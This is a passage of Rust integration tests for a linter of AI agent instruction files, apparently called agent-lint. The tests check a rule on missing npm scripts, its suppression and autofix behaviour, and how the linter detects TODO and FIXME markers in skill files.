    for strictness in ["--pedantic", "--all"] {
        let output = run_in(
            tmp.path(),
            &["--format", "json", strictness, "--only", "L006", "."],
        );
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        assert_eq!(json(&output)["diagnostics"][0]["severity"], "error");
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"L006\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--format", "json", "--only", "L006", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert!(
        json(&suppressed)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"CLAUDE.md\"]\nsuppress = [\"L006\"]\n",
    )
    .unwrap();
    let per_file = run_in(tmp.path(), &["--format", "json", "--only", "L006", "."]);
    assert!(per_file.status.success(), "stderr: {}", stderr(&per_file));
    assert!(
        json(&per_file)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    let autofix = run_in(tmp.path(), &["--autofix", "--only", "L006", "."]);
    assert!(autofix.status.success(), "stderr: {}", stderr(&autofix));
    let after = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
    assert!(
        after.contains("npm run missing-fenced"),
        "L006 must remain byte-idempotent under --autofix"
    );
}

#[test]
fn l006_cli_runs_in_basic_and_plugin_modes() {
    let basic = tempfile::tempdir().unwrap();
    init_git(basic.path());
    std::fs::write(
        basic.path().join("package.json"),
        r#"{"name":"demo","scripts":{"test":"echo"}}"#,
    )
    .unwrap();
    std::fs::write(
        basic.path().join("CLAUDE.md"),
        "```bash\nnpm run missing-basic\n```\n",
    )
    .unwrap();
    let basic_out = run_in(basic.path(), &["--format", "json", "--only", "L006", "."]);
    assert!(basic_out.status.success(), "stderr: {}", stderr(&basic_out));
    assert_eq!(
        json(&basic_out)["diagnostics"][0]["evidence"],
        "missing-basic"
    );

    let plugin = tempfile::tempdir().unwrap();
    init_git(plugin.path());
    std::fs::create_dir_all(plugin.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        plugin.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"demo","version":"1.0.0","description":"fixture"}"#,
    )
    .unwrap();
    std::fs::write(
        plugin.path().join("package.json"),
        r#"{"name":"demo","scripts":{"test":"echo"}}"#,
    )
    .unwrap();
    std::fs::write(
        plugin.path().join("CLAUDE.md"),
        "```bash\nnpm run missing-plugin\n```\n",
    )
    .unwrap();
    let plugin_out = run_in(plugin.path(), &["--format", "json", "--only", "L006", "."]);
    assert!(
        plugin_out.status.success(),
        "stderr: {}",
        stderr(&plugin_out)
    );
    assert_eq!(
        json(&plugin_out)["diagnostics"][0]["evidence"],
        "missing-plugin"
    );
}

#[test]
fn unfinished_work_markers_report_structured_span_and_ignore_prose() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"todo-marker","version":"1.0.0"}"#,
    )
    .unwrap();
    std::fs::create_dir_all(tmp.path().join("skills/demo")).unwrap();
    std::fs::write(
        tmp.path().join("skills/demo/SKILL.md"),
        "---\nname: demo\ndescription: Use when validating unfinished-work CLI behavior\n---\nRemove any TODO or FIXME markers from generated output before returning it.\nDo not hack around the permission system.\n- [ ] FIXME: real debt\nTODO: later\n",
    )
    .unwrap();
    std::fs::create_dir_all(tmp.path().join("agents")).unwrap();
    std::fs::write(
        tmp.path().join("agents/reviewer.md"),
        "---\nname: reviewer\ndescription: Use when validating unfinished-work CLI agent behavior\n---\nNever use xxx as a placeholder.\nReject output containing TODO, FIXME, HACK, or XXX markers.\n",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "# Project\nThe literal marker `TODO` is prohibited in committed instructions.\n",
    )
    .unwrap();

    for (arguments, severity, exit_code) in [
        (
            vec!["--format", "json", "--only", "G006,G007,D003", "."],
            "warning",
            0,
        ),
        (
            vec![
                "--format",
                "json",
                "--pedantic",
                "--only",
                "G006,G007,D003",
                ".",
            ],
            "error",
            1,
        ),
        (
            vec!["--format", "json", "--all", "--only", "G006,G007,D003", "."],
            "error",
            1,
        ),
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(
            output.status.code(),
            Some(exit_code),
            "stderr: {}",
            stderr(&output)
        );
        let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
        assert_eq!(diagnostics.len(), 1, "{diagnostics:#?}");
        let diagnostic = &diagnostics[0];
        assert_eq!(diagnostic["code"], "G006");
        assert_eq!(diagnostic["name"], "todo-in-skill");
        assert_eq!(diagnostic["severity"], severity);
        assert_eq!(diagnostic["subject_path"], "skills/demo/SKILL.md");
        assert_eq!(diagnostic["location"]["start"]["line"], 7);
        assert_eq!(diagnostic["location"]["start"]["column"], 7);
        assert_eq!(diagnostic["location"]["end"]["line"], 7);
        assert_eq!(diagnostic["location"]["end"]["column"], 12);
        assert_eq!(diagnostic["evidence"], "FIXME");
        assert_eq!(
            diagnostic["suggestion"],
            "Remove the unfinished-work marker before publishing."
        );
        assert!(
            !diagnostic["message"]
                .as_str()
                .unwrap()
                .contains("real debt")
        );
    }

    let autofix = run_in(
        tmp.path(),
        &[
            "--format",
            "json",
            "--autofix",
            "--only",
            "G006,G007,D003",
            ".",
        ],
    );
    assert_eq!(autofix.status.code(), Some(0));
    let after = std::fs::read_to_string(tmp.path().join("skills/demo/SKILL.md")).unwrap();
    assert!(after.contains("- [ ] FIXME: real debt"));
    assert!(after.contains("Do not hack around the permission system."));
}
